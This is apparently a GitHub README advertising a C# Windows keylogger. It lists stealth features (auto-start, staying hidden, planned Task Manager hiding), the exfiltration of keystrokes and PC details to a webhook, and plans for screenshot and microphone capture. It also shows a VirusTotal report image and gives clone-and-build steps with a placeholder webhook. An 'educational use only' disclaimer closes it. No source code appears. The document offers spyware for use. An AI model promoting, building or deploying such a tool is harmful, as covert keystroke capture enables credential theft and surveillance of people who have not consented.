<div align="center">

# Keylogger (C#)

[![.NET](https://img.shields.io/badge/.NET-512BD4?style=for-the-badge&logo=dotnet&logoColor=white)](https://dotnet.microsoft.com/)
[![C#](https://img.shields.io/badge/C%23-239120?style=for-the-badge&logo=c-sharp&logoColor=white)](https://docs.microsoft.com/en-us/dotnet/csharp/)
[![License](https://img.shields.io/badge/License-Educational-red?style=for-the-badge)](LICENSE)

**A Windows keylogger written in C#**

[Features](#features) • [Installation](#installation) • [Soon](#soon) • [Disclaimer](#disclaimer)

</div>

---

## Features

- [x] Add itself to startup
- [x] Sends PC information to webhook on run
- [x] Stays completely hidden
- [x] Logs keystrokes and sends them to the webhook

### Soon
- [ ] Smart keylogging
- [ ] Hidden on task manager
- [ ] Reports via email
- [ ] Mouse,Screenshot,Microphone 

---

## VirusTotal Report (as of 01/02/26)
<img width="1947" height="265" alt="image" src="https://github.com/user-attachments/assets/fa1dcbfd-48f3-4f4c-932f-2f49e82cb5ff" />

---

## Installation

### Step 1: Clone the Repository
```bash
git clone https://github.com/Daniel-191/Keylogger.git
cd Keylogger
```

### Step 2: Config
Open `main.cs` and replace `YOUR_WEBHOOK_HERE` with your actual webhook URL.

### Step 3: Build the Project
```bash
dotnet restore
dotnet build -c Release
```

### Step 4: Executable
The executable will be at `bin/Release/net*/main.exe`

---

## Disclaimer

> [!WARNING]
> **Educational use only.** This project exists for learning, testing, and research purposes. You must use it only in environments you own or explicitly control. You must have clear, documented permission from all affected parties. The developers do not encourage misuse. The developers do not participate in misuse. The developers are not responsible for actions taken by others. You are fully responsible for how you use this software. You must follow applicable laws, platform rules, and ethical standards.
